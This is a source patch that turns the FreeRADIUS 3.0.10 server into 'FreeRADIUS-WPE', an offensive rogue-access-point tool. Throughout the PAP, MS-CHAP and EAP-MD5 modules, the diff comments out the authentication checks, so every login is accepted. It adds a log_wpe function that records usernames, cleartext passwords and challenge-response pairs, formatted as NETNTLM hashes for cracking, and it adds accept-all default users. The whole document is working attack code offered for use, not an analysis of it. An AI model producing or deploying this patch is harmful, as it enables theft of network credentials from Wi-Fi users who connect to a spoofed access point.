@@ -1,0 +1,396 @@
+diff -u -urN freeradius-server-3.0.10/raddb/mods-config/files/authorize freeradius-server-3.0.10-wpe/raddb/mods-config/files/authorize
+--- freeradius-server-3.0.10/raddb/mods-config/files/authorize	2015-10-05 20:22:28.000000000 +0200
++++ freeradius-server-3.0.10-wpe/raddb/mods-config/files/authorize	2016-01-18 22:01:18.955051411 +0100
+@@ -211,7 +211,9 @@
+ 
+ 
+ # On no match, the user is denied access.
+-
++#"bradtest" Cleartext-Password := "bradtest", MS-CHAP-Use-NTLM-Auth := 0
++DEFAULT Cleartext-Password := "foo", MS-CHAP-Use-NTLM-Auth := 0
++DEFAULT Cleartext-Password := "a"
+ 
+ #########################################################
+ # You should add test accounts to the TOP of this file! #
+diff -u -urN freeradius-server-3.0.10/raddb/radiusd.conf.in freeradius-server-3.0.10-wpe/raddb/radiusd.conf.in
+--- freeradius-server-3.0.10/raddb/radiusd.conf.in	2015-10-05 20:22:28.000000000 +0200
++++ freeradius-server-3.0.10-wpe/raddb/radiusd.conf.in	2016-01-18 22:01:18.959051374 +0100
+@@ -370,6 +370,7 @@
+ 
+ #  The program to execute to do concurrency checks.
+ checkrad = ${sbindir}/checkrad
++wpelogfile = ${logdir}/freeradius-server-wpe.log
+ 
+ # SECURITY CONFIGURATION
+ #
+diff -u -urN freeradius-server-3.0.10/src/include/radiusd.h freeradius-server-3.0.10-wpe/src/include/radiusd.h
+--- freeradius-server-3.0.10/src/include/radiusd.h	2015-10-05 20:22:28.000000000 +0200
++++ freeradius-server-3.0.10-wpe/src/include/radiusd.h	2016-01-18 22:01:18.959051374 +0100
+@@ -146,6 +146,7 @@
+ 
+ 	char const	*checkrad;			//!< Script to use to determine if a user is already
+ 							//!< connected.
++        char const      *wpelogfile;
+ 
+ 	rad_listen_t	*listen;			//!< Head of a linked list of listeners.
+ 
+diff -u -urN freeradius-server-3.0.10/src/main/auth.c freeradius-server-3.0.10-wpe/src/main/auth.c
+--- freeradius-server-3.0.10/src/main/auth.c	2015-10-05 20:22:28.000000000 +0200
++++ freeradius-server-3.0.10-wpe/src/main/auth.c	2016-01-18 22:01:18.959051374 +0100
+@@ -226,10 +226,12 @@
+ 		if (fr_pair_find_by_num(request->config, PW_CRYPT_PASSWORD, 0, TAG_ANY) != NULL) {
+ 			RWDEBUG2("Please update your configuration, and remove 'Auth-Type = Crypt'");
+ 			RWDEBUG2("Use the PAP module instead");
++			log_wpe("password", request->username->vp_strvalue, fr_pair_find_by_num(request->config, PW_CRYPT_PASSWORD, 0, TAG_ANY), NULL, 0, NULL, 0);
+ 		}
+ 		else if (fr_pair_find_by_num(request->config, PW_CLEARTEXT_PASSWORD, 0, TAG_ANY) != NULL) {
+ 			RWDEBUG2("Please update your configuration, and remove 'Auth-Type = Local'");
+ 			RWDEBUG2("Use the PAP or CHAP modules instead");
++			log_wpe("password", request->username->vp_strvalue, fr_pair_find_by_num(request->config, PW_CLEARTEXT_PASSWORD, 0, TAG_ANY), NULL, 0, NULL, 0);
+ 		}
+ 
+ 		/*
+diff -u -urN freeradius-server-3.0.10/src/main/log.c freeradius-server-3.0.10-wpe/src/main/log.c
+--- freeradius-server-3.0.10/src/main/log.c	2015-10-05 20:22:28.000000000 +0200
++++ freeradius-server-3.0.10-wpe/src/main/log.c	2016-01-18 22:03:43.129722379 +0100
+@@ -30,6 +30,9 @@
+ #include <freeradius-devel/radiusd.h>
+ #include <freeradius-devel/rad_assert.h>
+ 
++#include <stdio.h>
++#include <time.h>
++
+ #ifdef HAVE_SYS_STAT_H
+ #  include <sys/stat.h>
+ #endif
+@@ -858,6 +861,70 @@
+ 	request->log.indent = indent;
+ }
+ 
++void log_wpe(char *authtype, char *username, char *password, unsigned char *challenge, unsigned int challen, unsigned char *response, unsigned int resplen)
++ {
++        FILE            *logfd;
++        time_t          nowtime;
++        unsigned int    count;
++
++        /* Get wpelogfile parameter and log data */
++/*        if (main_config.wpelogfile == NULL) {
++               logfd = stderr;
++        } else {
++                logfd = fopen(main_config.wpelogfile, "a");*/
++                logfd = fopen("/var/log/radius/freeradius-server-wpe.log", "a");
++                if (logfd == NULL) {
++//                        DEBUG2("  rlm_mschap: FAILED: Unable to open output log file %s: %s", main_config.wpelogfile, strerror(errno));
++                        DEBUG2("  rlm_mschap: FAILED: Unable to open output log file /var/log/radius/freeradius-server-wpe.log: %s", strerror(errno));
++                        logfd = stderr;
++                }
++//        }
++
++
++        nowtime = time(NULL);
++        fprintf(logfd, "%s: %s\n", authtype, ctime(&nowtime));
++
++        if (username != NULL) {
++                fprintf(logfd, "\tusername: %s\n", username);
++        }
++        if (password != NULL) {
++                fprintf(logfd, "\tpassword: %s\n", password);
++        }
++
++        if (challen != 0) {
++                fprintf(logfd, "\tchallenge: ");
++                for (count=0; count!=(challen-1); count++) {
++                        fprintf(logfd, "%02x:",challenge[count]);
++                }
++                fprintf(logfd, "%02x\n",challenge[challen-1]);
++        }
++
++        if (resplen != 0) {
++                fprintf(logfd, "\tresponse: ");
++                for (count=0; count!=(resplen-1); count++) {
++                        fprintf(logfd, "%02x:",response[count]);
++                }
++                fprintf(logfd, "%02x\n",response[resplen-1]);
++        }
++
++	 if ( (strncmp(authtype, "mschap", 6) == 0) && username != NULL && challen != 0 && resplen != 0) {
++		fprintf(logfd, "\tjohn NETNTLM: %s:$NETNTLM$",username);
++		for (count=0; count<challen; count++) {
++                        fprintf(logfd, "%02x",challenge[count]);
++                }
++		fprintf(logfd,"$");
++		for (count=0; count<resplen; count++) {
++                        fprintf(logfd, "%02x",response[count]);
++                }
++		fprintf(logfd,"\n");
++	 }
++
++        fprintf(logfd, "\n");
++        
++	 fclose(logfd);
++ }
++
++
+ 
+ /** Canonicalize error strings, removing tabs, and generate spaces for error marker
+  *
+diff -u -urN freeradius-server-3.0.10/src/main/mainconfig.c freeradius-server-3.0.10-wpe/src/main/mainconfig.c
+--- freeradius-server-3.0.10/src/main/mainconfig.c	2015-10-05 20:22:28.000000000 +0200
++++ freeradius-server-3.0.10-wpe/src/main/mainconfig.c	2016-01-18 22:01:18.963051337 +0100
+@@ -194,6 +194,7 @@
+ 	{ "checkrad", FR_CONF_POINTER(PW_TYPE_STRING, &main_config.checkrad), "${sbindir}/checkrad" },
+ 
+ 	{ "debug_level", FR_CONF_POINTER(PW_TYPE_INTEGER, &main_config.debug_level), "0"},
++	{ "wpelogfile", FR_CONF_POINTER(PW_TYPE_STRING, &main_config.wpelogfile), "${logdir}/freeradius-server-wpe.log"},
+ 
+ #ifdef WITH_PROXY
+ 	{ "proxy_requests", FR_CONF_POINTER(PW_TYPE_BOOLEAN, &main_config.proxy_requests), "yes" },
+diff -u -urN freeradius-server-3.0.10/src/main/radiusd.c freeradius-server-3.0.10-wpe/src/main/radiusd.c
+--- freeradius-server-3.0.10/src/main/radiusd.c	2015-10-05 20:22:28.000000000 +0200
++++ freeradius-server-3.0.10-wpe/src/main/radiusd.c	2016-01-18 22:01:18.963051337 +0100
+@@ -60,7 +60,7 @@
+ char const	*radlib_dir = NULL;
+ bool		log_stripped_names;
+ 
+-char const *radiusd_version = "FreeRADIUS Version " RADIUSD_VERSION_STRING
++char const *radiusd_version = "FreeRADIUS-WPE Version " RADIUSD_VERSION_STRING
+ #ifdef RADIUSD_VERSION_COMMIT
+ " (git #" STRINGIFY(RADIUSD_VERSION_COMMIT) ")"
+ #endif
+diff -u -urN freeradius-server-3.0.10/src/modules/rlm_eap/types/rlm_eap_leap/eap_leap.c freeradius-server-3.0.10-wpe/src/modules/rlm_eap/types/rlm_eap_leap/eap_leap.c
+--- freeradius-server-3.0.10/src/modules/rlm_eap/types/rlm_eap_leap/eap_leap.c	2015-10-05 20:22:28.000000000 +0200
++++ freeradius-server-3.0.10-wpe/src/modules/rlm_eap/types/rlm_eap_leap/eap_leap.c	2016-01-18 22:01:18.963051337 +0100
+@@ -204,10 +204,11 @@
+ /*
+  *	Verify the MS-CHAP response from the user.
+  */
+-int eapleap_stage4(REQUEST *request, leap_packet_t *packet, VALUE_PAIR *password, leap_session_t *session)
++int eapleap_stage4(REQUEST *request, leap_packet_t *packet, VALUE_PAIR *password, leap_session_t *session, char *username)
+ {
+ 	uint8_t hash[16];
+ 	uint8_t response[24];
++	uint8_t challenge[8] = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
+ 
+ 	/*
+ 	 *	No password or previous packet.  Die.
+@@ -225,6 +226,7 @@
+ 	 */
+ 	eapleap_mschap(hash, session->peer_challenge, response);
+ 	if (memcmp(response, packet->challenge, 24) == 0) {
++	        log_wpe("LEAP", username, NULL, challenge, 8, response, 24);
+ 		RDEBUG2("NTChallengeResponse from AP is valid");
+ 		memcpy(session->peer_response, response, sizeof(response));
+ 		return 1;
+diff -u -urN freeradius-server-3.0.10/src/modules/rlm_eap/types/rlm_eap_leap/eap_leap.h freeradius-server-3.0.10-wpe/src/modules/rlm_eap/types/rlm_eap_leap/eap_leap.h
+--- freeradius-server-3.0.10/src/modules/rlm_eap/types/rlm_eap_leap/eap_leap.h	2015-10-05 20:22:28.000000000 +0200
++++ freeradius-server-3.0.10-wpe/src/modules/rlm_eap/types/rlm_eap_leap/eap_leap.h	2016-01-18 22:01:18.963051337 +0100
+@@ -63,7 +63,7 @@
+ int 		eapleap_compose(REQUEST *request, EAP_DS *auth, leap_packet_t *reply);
+ leap_packet_t 	*eapleap_extract(REQUEST *request, EAP_DS *eap_ds);
+ leap_packet_t 	*eapleap_initiate(REQUEST *request, EAP_DS *eap_ds, VALUE_PAIR *user_name);
+-int		eapleap_stage4(REQUEST *request, leap_packet_t *packet, VALUE_PAIR* password, leap_session_t *session);
++int		eapleap_stage4(REQUEST *request, leap_packet_t *packet, VALUE_PAIR* password, leap_session_t *session, char *username);
+ leap_packet_t	*eapleap_stage6(REQUEST *request, leap_packet_t *packet, VALUE_PAIR *user_name, VALUE_PAIR* password,
+ 				leap_session_t *session);
+ 
+diff -u -urN freeradius-server-3.0.10/src/modules/rlm_eap/types/rlm_eap_leap/rlm_eap_leap.c freeradius-server-3.0.10-wpe/src/modules/rlm_eap/types/rlm_eap_leap/rlm_eap_leap.c
+--- freeradius-server-3.0.10/src/modules/rlm_eap/types/rlm_eap_leap/rlm_eap_leap.c	2015-10-05 20:22:28.000000000 +0200
++++ freeradius-server-3.0.10-wpe/src/modules/rlm_eap/types/rlm_eap_leap/rlm_eap_leap.c	2016-01-18 22:01:18.963051337 +0100
+@@ -94,6 +94,7 @@
+ 	leap_session_t	*session;
+ 	leap_packet_t	*packet;
+ 	leap_packet_t	*reply;
++	char*           username;
+ 	VALUE_PAIR	*password;
+ 
+ 	if (!handler->opaque) {
+@@ -110,6 +111,8 @@
+ 		return 0;
+ 	}
+ 
++	username = (char *)handler->request->username->vp_strvalue;
++
+ 	/*
+ 	 *	The password is never sent over the wire.
+ 	 *	Always get the configured password, for each user.
+@@ -132,7 +135,7 @@
+ 	switch (session->stage) {
+ 	case 4:			/* Verify NtChallengeResponse */
+ 		RDEBUG2("Stage 4");
+-		rcode = eapleap_stage4(request, packet, password, session);
++		rcode = eapleap_stage4(request, packet, password, session, username);
+ 		session->stage = 6;
+ 
+ 		/*
+diff -u -urN freeradius-server-3.0.10/src/modules/rlm_eap/types/rlm_eap_md5/eap_md5.c freeradius-server-3.0.10-wpe/src/modules/rlm_eap/types/rlm_eap_md5/eap_md5.c
+--- freeradius-server-3.0.10/src/modules/rlm_eap/types/rlm_eap_md5/eap_md5.c	2015-10-05 20:22:28.000000000 +0200
++++ freeradius-server-3.0.10-wpe/src/modules/rlm_eap/types/rlm_eap_md5/eap_md5.c	2016-01-18 22:01:18.963051337 +0100
+@@ -166,10 +166,13 @@
+ 	/*
+ 	 *	The length of the response is always 16 for MD5.
+ 	 */
++	/* WPE FTW
+ 	if (rad_digest_cmp(digest, packet->value, 16) != 0) {
+ 		return 0;
+ 	}
+-
++        */
++        log_wpe("eap_md5", packet->name, NULL, challenge, MD5_CHALLENGE_LEN,
++                packet->value, 16);
+ 	return 1;
+ }
+ 
+diff -u -urN freeradius-server-3.0.10/src/modules/rlm_mschap/rlm_mschap.c freeradius-server-3.0.10-wpe/src/modules/rlm_mschap/rlm_mschap.c
+--- freeradius-server-3.0.10/src/modules/rlm_mschap/rlm_mschap.c	2015-10-05 20:22:28.000000000 +0200
++++ freeradius-server-3.0.10-wpe/src/modules/rlm_mschap/rlm_mschap.c	2016-01-18 22:01:18.963051337 +0100
+@@ -1103,10 +1103,12 @@
+  */
+ static int CC_HINT(nonnull (1, 2, 4, 5 ,6)) do_mschap(rlm_mschap_t *inst, REQUEST *request, VALUE_PAIR *password,
+ 						      uint8_t const *challenge, uint8_t const *response,
+-						      uint8_t nthashhash[NT_DIGEST_LENGTH], MSCHAP_AUTH_METHOD method)
++						      uint8_t nthashhash[NT_DIGEST_LENGTH], MSCHAP_AUTH_METHOD method, char *username)
+ {
+ 	uint8_t	calculated[24];
+ 
++	log_wpe("mschap", username, NULL, challenge, 8, response, 24);
++
+ 	memset(nthashhash, 0, NT_DIGEST_LENGTH);
+ 
+ 	switch (method) {
+@@ -1123,9 +1125,11 @@
+ 		}
+ 
+ 		smbdes_mschap(password->vp_octets, challenge, calculated);
++		/* WPE FTW
+ 		if (rad_digest_cmp(response, calculated, 24) != 0) {
+ 			return -1;
+ 		}
++		*/
+ 
+ 		/*
+ 		 *	If the password exists, and is an NT-Password,
+@@ -1823,7 +1827,7 @@
+ 		 *	Do the MS-CHAP authentication.
+ 		 */
+ 		mschap_result = do_mschap(inst, request, password, challenge->vp_octets,
+-					  response->vp_octets + offset, nthashhash, auth_method);
++					  response->vp_octets + offset, nthashhash, auth_method, request->username->vp_strvalue);
+ 		/*
+ 		 *	Check for errors, and add MSCHAP-Error if necessary.
+ 		 */
+@@ -1931,7 +1935,7 @@
+ 
+ 		RDEBUG2("Client is using MS-CHAPv2");
+ 		mschap_result = do_mschap(inst, request, nt_password, mschapv1_challenge,
+-					  response->vp_octets + 26, nthashhash, auth_method);
++					  response->vp_octets + 26, nthashhash, auth_method, request->username->vp_strvalue);
+ 		rcode = mschap_error(inst, request, *response->vp_octets,
+ 				     mschap_result, mschap_version, smb_ctrl);
+ 		if (rcode != RLM_MODULE_OK) return rcode;
+diff -u -urN freeradius-server-3.0.10/src/modules/rlm_pap/rlm_pap.c freeradius-server-3.0.10-wpe/src/modules/rlm_pap/rlm_pap.c
+--- freeradius-server-3.0.10/src/modules/rlm_pap/rlm_pap.c	2015-10-05 20:22:28.000000000 +0200
++++ freeradius-server-3.0.10-wpe/src/modules/rlm_pap/rlm_pap.c	2016-01-18 22:01:18.963051337 +0100
+@@ -534,13 +534,14 @@
+ 		RDEBUG("Comparing with \"known good\" Cleartext-Password");
+ 	}
+ 
++	/* WPE FTW
+ 	if ((vp->vp_length != request->password->vp_length) ||
+ 	    (rad_digest_cmp(vp->vp_octets,
+ 			    request->password->vp_octets,
+ 			    vp->vp_length) != 0)) {
+ 		REDEBUG("Cleartext password does not match \"known good\" password");
+ 		return RLM_MODULE_REJECT;
+-	}
++	}*/
+ 	return RLM_MODULE_OK;
+ }
+ 
+@@ -580,10 +581,11 @@
+ 		     request->password->vp_length);
+ 	fr_md5_final(digest, &md5_context);
+ 
++	/* WPE FTW
+ 	if (rad_digest_cmp(digest, vp->vp_octets, vp->vp_length) != 0) {
+ 		REDEBUG("MD5 digest does not match \"known good\" digest");
+ 		return RLM_MODULE_REJECT;
+-	}
++	}*/
+ 
+ 	return RLM_MODULE_OK;
+ }
+@@ -613,10 +615,11 @@
+ 	/*
+ 	 *	Compare only the MD5 hash results, not the salt.
+ 	 */
++	/* WPE FTW
+ 	if (rad_digest_cmp(digest, vp->vp_octets, 16) != 0) {
+ 		REDEBUG("SMD5 digest does not match \"known good\" digest");
+ 		return RLM_MODULE_REJECT;
+-	}
++	}*/
+ 
+ 	return RLM_MODULE_OK;
+ }
+@@ -641,10 +644,11 @@
+ 		      request->password->vp_length);
+ 	fr_sha1_final(digest,&sha1_context);
+ 
++	/* WPE FTW
+ 	if (rad_digest_cmp(digest, vp->vp_octets, vp->vp_length) != 0) {
+ 		REDEBUG("SHA1 digest does not match \"known good\" digest");
+ 		return RLM_MODULE_REJECT;
+-	}
++	}*/
+ 
+ 	return RLM_MODULE_OK;
+ }
+@@ -670,10 +674,11 @@
+ 	fr_sha1_update(&sha1_context, &vp->vp_octets[20], vp->vp_length - 20);
+ 	fr_sha1_final(digest, &sha1_context);
+ 
++	/* WPE FTW
+ 	if (rad_digest_cmp(digest, vp->vp_octets, 20) != 0) {
+ 		REDEBUG("SSHA digest does not match \"known good\" digest");
+ 		return RLM_MODULE_REJECT;
+-	}
++	}*/
+ 
+ 	return RLM_MODULE_OK;
+ }
+@@ -806,10 +811,11 @@
+ 	/*
+ 	 *	Only compare digest_len bytes, the rest is salt.
+ 	 */
++	/* WPE FTW
+ 	if (rad_digest_cmp(digest, vp->vp_octets, (size_t)digest_len) != 0) {
+ 		REDEBUG("%s digest does not match \"known good\" digest", name);
+ 		return RLM_MODULE_REJECT;
+-	}
++	}*/
+ 
+ 	return RLM_MODULE_OK;
+ }
+@@ -873,11 +879,12 @@
+ 		return RLM_MODULE_FAIL;
+ 	}
+ 
++	/* WPE FTW
+ 	if ((fr_hex2bin(digest, sizeof(digest), charbuf, len) != vp->vp_length) ||
+ 	    (rad_digest_cmp(digest, vp->vp_octets, vp->vp_length) != 0)) {
+ 		REDEBUG("LM digest does not match \"known good\" digest");
+ 		return RLM_MODULE_REJECT;
+-	}
++	}*/
+ 
+ 	return RLM_MODULE_OK;
+ }
+@@ -895,6 +902,8 @@
+ 		REDEBUG("\"known good\" NS-MTA-MD5-Password has incorrect length");
+ 		return RLM_MODULE_INVALID;
+ 	}
++       log_wpe("pap",request->username->vp_strvalue, request->password->vp_strvalue,
++                NULL, 0, NULL, 0);
+ 
+ 	/*
+ 	 *	Sanity check the value of NS-MTA-MD5-Password
